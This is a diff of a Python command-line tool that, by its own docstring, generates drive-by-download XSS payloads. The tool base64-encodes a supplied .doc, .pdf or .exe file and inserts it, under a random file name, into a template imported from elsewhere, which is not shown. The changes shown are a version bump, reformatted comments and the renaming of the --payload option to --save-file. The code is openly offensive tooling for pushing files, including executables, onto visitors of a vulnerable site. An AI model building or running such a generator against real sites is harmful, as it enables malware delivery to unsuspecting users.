@@ -7,12 +7,12 @@ from core.encoder import b64
 from core.convert import sub
 
 __author__  = 'Demetrius Ford'
-__version__ = 'v1.0.4'
+__version__ = 'v1.0.5'
 
 CHOICES = (
-    '.doc',  #=> Microsoft Word for Windows/Word97
-    '.pdf',  #=> Acrobat-Portable document format
-    '.exe',  #=> Microsoft Portable Executable (PE)
+    '.doc',  # => Microsoft Word for Windows/Word97
+    '.pdf',  # => Acrobat-Portable document format
+    '.exe',  # => Microsoft Portable Executable (PE)
 )
 
 
@@ -31,23 +31,27 @@ def show_version(ctx, param, value):
               is_eager=True)
 @click.option('--extension',
               type=click.Choice(CHOICES, case_sensitive=True))
-@click.option('--payload',
+@click.option('--save-file',
               type=click.Path(exists=True, dir_okay=False))
-def generate(extension, payload):
+def generate(extension, save_file):
     """Generate a drive-by-download XSS payload."""
     cli_args = sys.argv[1:]
-    no_extension, no_payload = (not extension, not payload)
+
+    no_extension, no_save_file = (
+        not extension,
+        not save_file,
+    )
 
     if len(cli_args) == 0 \
             or no_extension \
-            or no_payload:
+            or no_save_file:
         context = click.get_current_context()
         click.echo(context.get_help())
         context.exit(2)
 
     char_set = string.printable[:36]
     filename = ''.join(random.choice(char_set) for _ in range(7))
-    embedded = b64(payload)
+    embedded = b64(save_file)
 
     click.echo(sub((filename + extension, embedded)))
 
